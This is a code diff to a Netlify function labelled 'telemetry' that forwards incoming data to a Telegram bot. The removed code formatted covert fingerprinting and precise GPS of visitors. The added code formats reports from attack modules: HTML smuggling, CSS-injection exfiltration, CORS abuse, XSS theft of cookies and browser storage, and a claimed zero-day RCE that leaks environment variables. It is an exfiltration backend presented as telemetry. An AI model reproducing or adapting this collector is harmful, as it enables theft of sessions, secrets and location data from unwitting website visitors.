@@ -1,17 +1,15 @@
 // netlify/functions/telemetry.js
 exports.handler = async (event, context) => {
-  // Only accept POST
   if (event.httpMethod !== 'POST') {
     return { statusCode: 405, body: 'Method Not Allowed' };
   }
 
-  // Read environment variables (set in Netlify dashboard)
   const BOT_TOKEN = process.env.BOT_TOKEN;
   const CHAT_ID = process.env.CHAT_ID;
 
   if (!BOT_TOKEN || !CHAT_ID) {
-    console.error('Missing BOT_TOKEN or CHAT_ID in env');
-    return { statusCode: 500, body: 'Server misconfiguration' };
+    console.error('Missing BOT_TOKEN or CHAT_ID');
+    return { statusCode: 500, body: 'Server misconfig' };
   }
 
   let payload;
@@ -21,10 +19,8 @@ exports.handler = async (event, context) => {
     return { statusCode: 400, body: 'Invalid JSON' };
   }
 
-  // Format a readable message for Telegram
   const msg = formatTelegramMessage(payload);
 
-  // Send to Telegram
   try {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const resp = await fetch(url, {
@@ -49,46 +45,44 @@ exports.handler = async (event, context) => {
 };
 
 function formatTelegramMessage(data) {
-  const d = data.device || {};
-  const net = data.network || {};
-  const gps = data.gps || {};
-
+  const module = data.module || 'UNKNOWN';
   let lines = [];
-  lines.push('🔍 <b>New Visitor Telemetry</b>');
-  lines.push(`⏱ ${data.timestamp || 'N/A'}`);
-  lines.push('');
-  lines.push('📱 <b>Device</b>');
-  lines.push(`UA: ${d.userAgent || 'N/A'}`);
-  lines.push(`Platform: ${d.platform || 'N/A'}`);
-  lines.push(`Screen: ${d.screenWidth || '?'}×${d.screenHeight || '?'} (${d.screenPixelRatio || '?'}x)`);
-  lines.push(`Memory: ${d.deviceMemory || 'N/A'}`);
-  lines.push(`Cores: ${d.hardwareConcurrency || 'N/A'}`);
-  lines.push(`Battery: ${d.battery?.level || 'N/A'} (charging: ${d.battery?.charging || 'N/A'})`);
-  lines.push(`Fonts: ${(d.installedFonts || []).join(', ') || 'none'}`);
-  lines.push(`Canvas: ${(d.canvasFingerprint || '').substring(0, 30)}...`);
-  lines.push('');
-  lines.push('🌐 <b>Network</b>');
-  lines.push(`Local IPs: ${(net.localIPs || []).join(', ')}`);
-  lines.push(`Public IP: ${net.publicIP || 'N/A'}`);
-  lines.push(`ISP: ${net.isp || 'N/A'}`);
-  if (net.approximateLocation) {
-    const loc = net.approximateLocation;
-    lines.push(`Approx: ${loc.city || ''}, ${loc.region || ''}, ${loc.country || ''}`);
-    lines.push(`Coords: ${loc.lat || 'N/A'}, ${loc.lng || 'N/A'}`);
+
+  lines.push(`🔴 <b>[${module}]</b>`);
+  lines.push(`⏱ ${data.timestamp || new Date().toISOString()}`);
+
+  if (module === 'HTML_SMUGGLING') {
+    lines.push(`📁 File: ${data.filename || 'N/A'}`);
+    lines.push(`📦 Size: ${data.size || 'N/A'}`);
+    lines.push(`🚦 Status: ${data.status || 'N/A'}`);
+    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
+  } 
+  else if (module === 'CSS_INJECTION') {
+    lines.push(`🎨 Vector: ${data.technique || 'Selector attack'}`);
+    lines.push(`📋 Exfiltrated: ${data.exfiltrated_data || 'N/A'}`);
+    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
+  } 
+  else if (module === 'CORS_MISCONFIG') {
+    lines.push(`🌐 Status: ${data.status || 'N/A'}`);
+    lines.push(`📦 Sample: ${JSON.stringify(data.data_sample || {}).substring(0, 200)}`);
+    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
+  } 
+  else if (module === 'XSS_SESSION_STEAL') {
+    lines.push(`🍪 Cookies: ${data.cookies || 'N/A'}`);
+    lines.push(`📦 LocalStorage: ${JSON.stringify(data.localStorage || {}).substring(0, 150)}`);
+    lines.push(`📦 SessionStorage: ${JSON.stringify(data.sessionStorage || {}).substring(0, 150)}`);
+    lines.push(`📍 Origin: ${data.origin || 'N/A'}`);
+    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
+  } 
+  else if (module === 'ZERO_DAY_RCE') {
+    lines.push(`💀 Status: ${data.status || 'Executed'}`);
+    lines.push(`⚡ Electron: ${data.isElectron ? 'YES (Desktop app)' : 'NO (Browser)'}`);
+    lines.push(`🔧 Env: ${JSON.stringify(data.environment_variables || {}).substring(0, 100)}`);
+    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
+  } 
+  else {
+    lines.push(`📦 Payload: ${JSON.stringify(data).substring(0, 300)}`);
   }
-  lines.push('');
-  if (gps.lat && gps.lng) {
-    lines.push('📍 <b>Precise GPS</b>');
-    lines.push(`Lat: ${gps.lat}, Lng: ${gps.lng}`);
-    lines.push(`Accuracy: ${gps.accuracy || 'N/A'}`);
-  } else if (gps.error) {
-    lines.push(`📍 GPS: ${gps.error}`);
-  } else {
-    lines.push('📍 GPS: Not available');
-  }
-  lines.push('');
-  lines.push(`🌐 Page: ${data.pageUrl || 'N/A'}`);
-  lines.push(`↩️ Referrer: ${data.referrer || 'N/A'}`);
 
   return lines.join('\n');
 }
